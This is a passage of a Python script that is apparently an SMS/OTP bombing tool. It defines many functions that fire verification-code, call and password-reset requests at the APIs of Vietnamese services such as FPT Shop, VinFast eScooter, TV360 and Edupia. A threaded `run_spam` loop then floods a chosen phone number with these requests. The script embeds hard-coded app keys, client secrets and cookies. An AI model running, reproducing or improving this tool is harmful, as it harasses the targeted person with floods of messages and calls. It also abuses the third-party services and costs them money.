        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0",
        "x-channel": "EStore",
    }
    json_data = {
        "phoneNumber": phone,
        "otpType": 1,
        "fromSys": "WEBKHLC",
    }
    try:
        response = requests.post(
            "https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification",
            headers=headers,
            json=json_data,
            timeout=15,
        )
    except:
        pass


def fptshop():

    headers = {
        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        "sec-ch-ua-mobile": "?0",
        "apptenantid": "E6770008-4AEA-4EE6-AEDE-691FD22F5C14",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0",
        "Content-Type": "application/json",
        "Referer": "https://fptshop.com.vn/",
        "order-channel": "1",
        "sec-ch-ua-platform": '"Windows"',
    }
    json_data = {"fromSys": "WEBKHICT", "otpType": 0, "phoneNumber": phone}
    try:
        r = requests.post(
            "https://papi.fptshop.com.vn/gw/is/user/new-send-verification",
            headers=headers,
            json=json_data,

        )
        _log("fptshop", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("fptshop", False, err=e)


def phuha():
    headers = {
        "Host": "phuha.winds.vn",
        "Content-Type": "application/json",
        "User-Agent": "PHUHA/4 CFNetwork/3826.400.120 Darwin/24.3.0",
        "Connection": "keep-alive",
        "Accept": "*/*",
        "token": "",
        "Content-Length": "22",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "vi-VN,vi;q=0.9",
    }
    json_data = {
        "phone": phone,
    }
    try:
        r = requests.post(
            "http://phuha.winds.vn/api/service/CheckPhone",
            headers=headers,
            json=json_data,
            timeout=15,
        )
        _log("phuha", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("phuha", False, err=e)


def vinfastescooter():

    headers = {
        "Host": "escooter-api.vinfast.vn",
        "content-type": "application/json",
        "accept": "application/json",
        "app_version": "2.25.0",
        "accept-language": "vi-VN",
        "platform": "Ios",
        "player_id": "8e6a098f-aeac-4c62-94a2-fd361c2a5f74",
        "user-agent": "eScooter/2024.1213.1812 CFNetwork/1335.0.3.4 Darwin/21.6.0",
        "client_id": "IOS00000009GNY9TB9YXKKY809QRK5SH",
        "device_id": "59A17FFC-EABF-42F6-B692-E2FC7CC39CEC",
        "os_version": "ios15.8.2",
        "client_secret": "IOS00009GNY9TB9YXKKY809QRK5SH9012345678901234567890123456789654",
        "device_model": 'Iphone 4.7"',
    }
    try:
        r = requests.post(
            "https://escooter-api.vinfast.vn/api-gateway/otp-management/v1.0/otp/generate",
            headers=headers,
            json={"type": "REGISTRATION", "mobile_number": phone},

        )
        _log("vinfastescooter", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("vinfastescooter", False, err=e)


def tv360():
    cookies = {
        "device-id": "s%3Awap_bd36142f-3f9e-48b7-8702-eaf24eee85b2.E7UHat%2BZVBxnrbp3QBamQj%2FOFe%2FIWM9r5jvcJXWNJTQ",
        "shared-device-id": "wap_bd36142f-3f9e-48b7-8702-eaf24eee85b2",
        "_ga": "GA1.1.326740773.1748097972",
    }
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Origin": "http://tv360.vn",
        "Referer": "http://tv360.vn/login?r=http%3A%2F%2Ftv360.vn%2F",
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
        "startTime": "1748148834187",
        "tz": "Asia/Saigon",
    }
    try:
        r = requests.post(
            "http://tv360.vn/public/v1/auth/get-otp-login",
            cookies=cookies,
            headers=headers,
            json={"msisdn": phone},
            verify=False,
        )
        _log("tv360", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("tv360", False, err=e)


def vhome():

    headers = {
        "host": "vcloudapi.innoway.vn",
        "accept": "*/*",
        "content-type": "application/json",
        "appkey": "nlaDOC8uS6Xn7L0JIcPD",
        "user-agent": "VTHome/2 CFNetwork/3826.400.120 Darwin/24.3.0",
        "appsecret": "yKeMoImiHp9DUXxoGpERza31xSyCWunW",
        "traceparent": "00-F1D0BD06A5534C8BB05BE6FD5D1A0066-0000000000000000-01",
        "accept-language": "vi-VN,vi;q=0.9",
        "accept-encoding": "gzip, deflate, br",
    }
    try:
        r = requests.post(
            "https://vcloudapi.innoway.vn/api/app/otp/vhome",
            headers=headers,
            json={"otp_type": "register", "phone": phone},

        )
        _log("vhome", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("vhome", False, err=e)


def sms24():
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json; charset=utf-8",
        "Accept-Language": "vi-VN",
        "Site-Id": "3",
        "Cache-Control": "no-cache",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    }
    try:
        r = requests.post(
            "https://api.vayvnd.net/v2/users/password-reset",
            headers=headers,
            json={
                "login": phone,
                "trackingId": "h7blInO8MLU8RzAcwH9w5VExPLv71ZvhkAlVwj5Mh7wjCLPgxWubUfWQTRHQw39q",
            },
            timeout=20,
        )
        _log("sms24", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("sms24", False, err=e)


def otp6():
    device_id = str(uuid.uuid4())
    headers1 = {
        "Host": "service3.edupia.vn",
        "accept": "*/*",
        "content-type": "application/json",
        "x-unity-version": "2020.3.48f1",
        "user-agent": "MonkeyJunior/410000799 CFNetwork/1335.0.3.4 Darwin/21.6.0",
        "accept-language": "vi-VN,vi;q=0.9",
        "access-control-allow-origin": "*",
    }
    json_data1 = {
        "app_code": "edupia_cap1",
        "app_version": "4.4.28",
        "device_os": "Other",
        "device_model": "iOS1582",
        "user_agent": "",
        "device_id": device_id,
        "device_name": "thanh",
        "ip": "",
        "user_id": 0,
        "ApiCache": {
            "ip_cache": {
                "client_ip": "",
                "client_ip_long": "",
                "country_code": "",
                "country_name": "",
                "region_name": "",
                "latitude": "",
                "longitude": "",
                "time_zone": "",
                "zip_ocd": "",
            }
        },
        "file": [],
        "parent_name": "dat sen",
        "phone": phone,
        "product_type": "1",
        "deviceId": "",
        "source_register": "App C1",
        "campaign_name": "Inhouse_Edupia TH App_Há»c_thá»­_V2_ÄÄng_kÃ½",
        "product_register": -1,
        "username": "",
        "utm_source": "",
    }
    cookies2 = {
        "_ga": "GA1.2.1688129155.1735460145",
        "_gid": "GA1.2.1381524696.1735460145",
    }
    headers2 = {
        "Host": "api-cms-core.edupia.vn",
        "accept": "*/*",
        "content-type": "application/json",
        "x-unity-version": "2020.3.48f1",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
        "accept-language": "vi-VN,vi;q=0.9",
        "access-control-allow-origin": "*",
    }
    json_data2 = {
        "app_code": "edupia_cap1",
        "app_version": "4.4.28",
        "device_os": "Other",
        "device_model": "iOS1582",
        "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "device_id": device_id,
        "device_name": "thanh",
        "ip": "",
        "user_id": 0,
        "ApiCache": {
            "ip_cache": {
                "client_ip": "",
                "client_ip_long": "",
                "country_code": "",
                "country_name": "",
                "region_name": "",
                "latitude": "",
                "longitude": "",
                "time_zone": "",
                "zip_ocd": "",
            }
        },
        "file": [],
        "phone": phone,
        "operation": 3,
    }
    try:
        requests.post(
            "https://service3.edupia.vn/service/v2/users/2.1/register/create-user-trial",
            headers=headers1,
            json=json_data1,
        )
        r = requests.post(
            "https://api-cms-core.edupia.vn/api/v2/authentication/get-vcode",
            cookies=cookies2,
            headers=headers2,
            json=json_data2,
        )
        _log("otp6", r.status_code < 400, r.status_code)
    except Exception as e:
        _log("otp6", False, err=e)


functions = [
    call22,
    marvay,
    otp22,
    sou1,
    otp2,
    otp11,
    p,
    call2,
    pp,
    call1,
    pppp,
    otp7,
    otp8,
    sms1,
    ila,
    king,
    king1,
    king2,
    king3,
    doccen,
    call9,
    doccen1,
    vinwonders,
    viettelpost,
    vttelecom,
    fptshop,
    tv360,
    vhome,
    debug_request,
    king4,
    king5,
    king6,
    phuha,
    vtmoney,
    vtsolution,
    aio,
    bibo,
    vinfastescooter,
    king7,
    king8,
    king9,
    king10,
    ppppp,
    ppppppp,
    sms2,
    sms24,
    sms5,
    marvay,
    uudai,
    call10,
    king11,
    king12,
    king13,
    king15,
    unica,
    vay_muon,
    otp5,
    otp,
    otp6,
    otp9,
    otp10,
]

def run_spam(target_phone: str, target_count: int):
    import sms as _sms
    _sms.phone = target_phone
    for func in functions:
        func.__globals__["phone"] = target_phone
    with concurrent.futures.ThreadPoolExecutor() as executor:
        for i in range(target_count):
            for func in functions:
                executor.submit(func)
                time.sleep(0)

if __name__ == "__main__":
    with concurrent.futures.ThreadPoolExecutor() as executor:
        for i in range(count):
            for func in functions:
                executor.submit(func)
                time.sleep(0)
